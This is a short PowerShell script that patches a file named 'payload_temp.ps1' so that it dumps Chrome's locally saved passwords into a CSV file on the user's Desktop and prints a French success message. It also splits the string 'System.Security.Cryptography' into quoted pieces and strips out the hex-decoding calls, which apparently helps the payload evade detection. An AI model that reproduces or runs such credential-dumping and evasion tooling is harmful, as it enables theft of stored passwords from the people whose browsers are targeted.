$c = Get-Content 'payload_temp.ps1' -Raw
$c = $c -replace '(?s)"Export".*?"Import"', '"Export" { } "Import"'
$c = $c -replace '\$arrExp \| Format-Table', ('$arrExp | Export-Csv -Path "' + $HOME + '\Desktop\Chrome_Local_Passwords.csv" -NoTypeInformation; Write-Host "`n[SUCCES] Mots de passe exportes sur le Bureau sous Chrome_Local_Passwords.csv !" -ForegroundColor Green')
$c = $c -replace '#requires -version 7', ''
$c = $c -replace '\[System\.Convert\]::FromHexString\(''(.*?)''\)', '($null) # $1'
$c = $c -replace 'System\.Security\.Cryptography', 'System.Security.Crypto''graphy'
Set-Content "test_run_chrome.ps1" -Value $c
